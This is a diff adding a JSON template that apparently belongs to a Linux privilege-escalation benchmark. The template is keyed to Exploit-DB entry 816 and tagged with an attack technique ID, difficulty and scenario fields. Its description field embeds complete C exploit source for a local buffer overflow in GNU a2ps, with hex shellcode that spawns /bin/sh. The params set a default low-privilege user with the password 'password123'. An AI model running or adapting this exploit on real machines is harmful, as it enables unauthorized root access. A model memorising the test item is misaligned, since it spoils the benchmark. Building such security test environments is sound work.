@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_816",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: GNU a2ps - Anything to PostScript Not SUID Local Overflow\n\nExploit source code (816.c):\n```\n/* Not added to Local Non Poc section /str0ke */\n\n#include <stdio.h>\n#include <stdlib.h>\n#include <errno.h>\n// by lizard / lizstyle[at]gmail.com\n// greets go to slider/trog for helpin me\n// not suid by default ;(\n#define VULNTHING \"/usr/bin/a2ps\"\n#define DEFRET 0xbffffffa - strlen(sc) - strlen(VULNTHING)\n#define xnullbitch 1100\n//i`m not a asm guru so i ripped this shellcode\n//shellcode by  man shadow\nchar sc[] =\n\"\\x31\\xC9\"              /* xor ecx,ecx     */\n\"\\x31\\xDB\"              /* xor ebx,ebx     */\n\"\\x6A\\x46\"              /* push byte 70    */\n\"\\x58\"                  /* pop eax         */\n\"\\xCD\\x80\"              /* int 80h         */\n\"\\x51\"                  /* push ecx        */\n\"\\x68\\x2F\\x2F\\x73\\x68\"  /* push 0x68732F2F */\n\"\\x68\\x2F\\x62\\x69\\x6E\"  /* push 0x6E69622F */\n\"\\x89\\xE3\"              /* mov ebx,esp     */\n\"\\x51\"                  /* push ecx        */\n\"\\x53\"                  /* push ebx        */\n\"\\x89\\xE1\"              /* mov ecx,esp     */\n\"\\x99\"                  /* cdq             */\n\"\\xB0\\x0B\"              /* mov al,11       */\n\"\\xCD\\x80\";             /* int 80h         */\n\nint main(void) {\n\nint ctr = 0;\nchar buffer[xnullbitch];\nfprintf(stdout, \"[*] 0x%8x\\n\", (long) DEFRET);\n\nfor(ctr = 0; ctr < xnullbitch - 1; ctr += 4)\n*(long *) &buffer[ctr] = (long) DEFRET;\n\nbuffer[xnullbitch - 1] = '\\0';\n\nif((setenv(\"HOME\", buffer, 1)) == -1) {\nperror(\"setenv()\");\nexit(1);\n}\n\nif((setenv(\"TOPX\", sc, 1)) == -1) {\nperror(\"setenv()\");\nexit(1);\n}\n\nif((execl(VULNTHING, VULNTHING, NULL)) == -1) {\nperror(\"execl()\");\nexit(1);\n}\nreturn(0);\n}\n\n// milw0rm.com [2005-02-13]\n```",
+  "cve": "",
+  "exploitdb_id": "816",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_816",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
